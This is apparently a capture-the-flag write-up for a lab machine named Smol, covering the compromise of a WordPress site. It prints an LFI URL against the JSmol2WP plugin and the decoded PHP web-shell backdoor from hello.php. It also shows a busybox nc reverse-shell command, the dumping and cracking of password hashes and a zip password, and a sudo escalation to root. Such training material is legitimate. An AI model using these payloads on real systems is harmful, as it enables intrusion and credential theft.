#### Introduction
At the heart of **Smol** is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.

Quick Tips: Do you know that on computers without GPU like the `AttackBox`, **John The Ripper** is faster than **Hashcat**?

---
### Enumeration
#### Nmap
```bash
nmap -p- -A 10.10.244.177                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 16:16 EDT
Nmap scan report for 10.10.244.177
Host is up (0.090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:69:26:94:4c:99:94:63:81:35:c4:7b:e5:4e:18:d4 (RSA)
|   256 50:cc:49:2d:72:21:38:9b:c0:4c:65:e9:b4:dd:31:a2 (ECDSA)
|_  256 d5:e5:b5:a5:72:ed:dd:78:bf:13:b8:8a:51:1b:66:fe (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   63.74 ms 10.14.0.1
2   83.08 ms 10.10.244.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.66 seconds
```

`http-title: Did not follow redirect to http://www.smol.thm` means that the `IP` is not resolved to the DNS address because it is missing from `/etc/hosts` file.

#### Mapping the IP to the DNS address
```bash
sudo vim /etc/hosts
<IP> www.smol.thm
```

Now, we have the website working and showing the web page.

![[Smol_webpage.png]]

Inside the `RCE` title, there's a `Comment` section where it says `You must be logged in to post a comment.` When we click the `logged in` section, we get the `wp-login.php` web page. We can also get there by directory enumeration.

![[wp.png]]
#### Gobuster
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u www.smol.thm > gobuster       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.smol.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]

===============================================================
Finished
===============================================================
```

Now, that we have found that the website is using the `wordpress` we can use tools like `wpscan`.
#### WPScan Tool with an API-Token
```bash
wpscan --url http://www.smol.thm --api-token 8c1tS-----------------------1LU

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

The `version 1.07` and below are vulnerable and we can also see the location of the `jsmol2wp`. At the same time, we can also use the `Nmap Script` to enumerate further.
#### Nmap Script
```bash
nmap -p80 --script http-wordpress-enum,http-wordpress-users 10.10.244.177
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 17:05 EDT
Nmap scan report for www.smol.thm (10.10.244.177)
Host is up (0.11s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   plugins
|_    akismet 5.2
| http-wordpress-users: 
| Username found: admin
| Username found: wp
| Username found: think
| Username found: gege
| Username found: diego
| Username found: xavi
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'

Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
```

We've managed to get a few `wordpress users` from the nmap script enumeration.

After the nmap script is complete, we navigated to that location `http://www.smol.thm/wp-content/plugins/jsmol2wp/` and found few folders and files. After searching for the `jsmol2wp exploit` and there are a few mentioning `WordPress JSmol2WP <=1.07`, so we followed the `wpscan` website which has the `Local File Inclusion (LFI):
```bash
http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php.
```

---
### Initial Access

We changed the `localhost:8000` to `www.smol.thm` and we used this to get the `wp-config.php` file.
![[wp-config.png]]

Inside this file is a password of the `wpuser: kbLSF2Vop#lw3rjDZ629*Z%G`. We used these creds to login to the wordpress and it worked. Under `Pages --> Webmaster Tasks`, there's some kind of `to-do list.`

![[Webmaster-tasks.png]]

The first tasks hints us that there could be a `Hello Dolly` plugin vulnerability. 
#### What is `Hello Dolly` Plugin?
**Hello Dolly** is a simple WordPress plugin that comes `preinstalled` in WordPress. It displays random lines from the song `Hello Dolly` by Louis Armstrong in the WordPress dashboard.

Since, we have found the plugin is installed in the WordPress we can try to Directory Traversal to `plugins`. At the moment, we are here: `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/` and we need to go back two steps to `http://www.smol.thm/wp-content/plugins/` to access `hello.php.` So, the complete address will look like this: 
```bash
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php.
```

Using the Directory Traversal/LFI, we have managed to get the `hello.php` plugin's content.

![[hello.png]]

There's a base64 encoded code. Let's decode it.
```bash
echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d
```

We get this code from the base64 encoded code: `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`. This line is using **obfuscated PHP code** - **octal** and **hexadecimal** character encoding and upon further decoding this, we get: 
```bash
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }.
```

This code is checking if the `cmd` parameter exists in the URL query string. If it does then it passes the value to `system()`, which executes the command and outputs the result on the web page. So, that means we can use this `cmd` parameter to execute our commands. I tried the following and it worked:
```bash
http://www.smol.thm/wp-admin/edit.php?cmd=ls
```

#### Get a Reverse Shell
**On Website**
```bash
http://www.smol.thm/wp-admin/edit.php?cmd=busybox%20nc%2010.14.101.2%204444%20-e%20sh
```
- `busybox` with the `URL Encode` is used to get a reverse shell. 

**On Local Machine**
```bash
nc -nvlp 4444
```

We received a shell back and upgraded the shell afterwards which gave us an interactive shell.

![[Shell.png]]

I checked the process running on the system.
```bash 
ps aux 

# Output
mysql        888  0.4 10.7 1795728 426436 ?      Ssl  01:43   0:10 /usr/sbin/mysqld
```

MySql service is running and lets login with the creds found earlier `wpuser:kbLSF2Vop#lw3rjDZ629*Z%G`
```bash
mysql -u wpuser -p
```

We're now inside MySql and enumerate to find useful information.
```mysql
show database;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)
```

There's a `wordpress` database which we can enumerate.
```mysql
use wordpress;
show tables;
+---------------------------+
| Tables_in_wordpress       |
+---------------------------+
| wp_users                  |
+---------------------------+
42 rows in set (0.00 sec)
```
- This gives us a huge table but it has `wp_users` table which we can look into.

Let's check what's inside `wp_users.`
```mysql
# Use this command to check the headings
select * from wp_users

# Use this command to select the headings you want to see
select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
+------------+------------------------------------+
6 rows in set (0.00 sec)
```

We've found the password list and now going to save it on our local machine in this format.
```bash
admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
wpuser:$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```

### Crack the Password list with John
```bash 
john --wordlist=/usr/share/wordlists/rockyou.txt wp_users
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiegocalifornia (diego)  
```

We have found the password for the user `diego:sandiegocalifornia`.

Let's switch user to `dieogo` and get the first flag.
```bash
su diego
cd 
cat user.txt
```

From there, we began to check the home folders for other users to find any useful information and found the `id_rsa` file in `think` user's.
```bash
ls -al gege ssm-user think xavi
total 31532
drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
drwxr-xr-x 8 root root         4096 Aug  2 03:47 ..
lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip

ssm-user:
total 20
drwxr-xr-x 2 ssm-user ssm-user 4096 Jul 20 11:11 .
drwxr-xr-x 8 root     root     4096 Aug  2 03:47 ..
-rw-r--r-- 1 ssm-user ssm-user  220 Jan 12  2024 .bash_logout
-rw-r--r-- 1 ssm-user ssm-user 3771 Jan 12  2024 .bashrc
-rw-r--r-- 1 ssm-user ssm-user  807 Jan 12  2024 .profile

think:
total 32
drwxr-x--- 5 think internal 4096 Jan 12  2024 .
drwxr-xr-x 8 root  root     4096 Aug  2 03:47 ..
lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
drwx------ 2 think think    4096 Jan 12  2024 .cache
drwx------ 3 think think    4096 Aug 18  2023 .gnupg
-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null

xavi:
total 20
drwxr-x--- 2 xavi internal 4096 Aug 18  2023 .
drwxr-xr-x 8 root root     4096 Aug  2 03:47 ..
lrwxrwxrwx 1 root root        9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 xavi xavi      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 xavi xavi     3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 xavi xavi      807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root        9 Aug 18  2023 .viminfo -> /dev/null
```

I copied the `private key` and used ssh to login as the user `think`.
```bash
ssh -i id_rsa think@10.10.223.120
```

We're now inside the `think` user's home directory but we could not find anything. From our earlier listing of the home directories of other users, we found `wordpress.old.zip` inside the user `gege`.

#### Switch to `gege`
```bash
su gege
```

We were not asked for any passwords. When we tried to unzip the file it asked for the password which we don't have. Let's transfer the file to out local machine to unzip the folder and see what's inside there. 

#### SCP from Victim's machine to Kali
```bash
scp wordpress.old.zip kali@IP:/home/kali/tryhackme/smol
```

Once we have received the file, we can use the tool `zip2john` to crack the zip password with `John`. 
```bash
zip2john wordpress.old.zip > crack-zip
```

Now, it's time to crack the zip file's password.
```bash
john --wordlist=/usr/share/wordlist/rockyou.txt crack-zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hero_gege@hotmail.com (wordpress.old.zip)     
1g 0:00:00:00 DONE (2025-08-02 19:55) 1.408g/s 10741Kp/s 10741Kc/s 10741KC/s hesse..hepiboth
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Here is the password: `hero_gege@hotmail.com`. Now, `unzip` the file.
```bash
unzip wordpress.old.zip
```

There are a lot of files and folders. So, I used the following command to find any possible `password` related to the users in the system.
```bash
cd wordpress.old
grep -ri "password" . | grep -Ei "gege|think|xavi"
./wp-admin/install.php:				<?php /* translators: The non-breaking space prevents 1Password from thinking the text "log in" should trigger a password save prompt. */ ?>
./wp-config.php:define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
```

We've found the password for the user `xavi:P@ssw0rdxavi@`.

---
### Privilege Escalation to Root
Since we have found the `xavi's` password, let's switch to his account.
```bash
su xavi
```

#### Check for the Sudo Privilege
```bash
sudo -l
Matching Defaults entries for xavi on ip-10-10-26-23:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on ip-10-10-26-23:
    (ALL : ALL) ALL
```

We can see the `xavi` is in the sudoers list. Now, we can just switch user to `root` and read the `root.txt` file.
```bash
sudo su
cd /root
cat root.txt
```

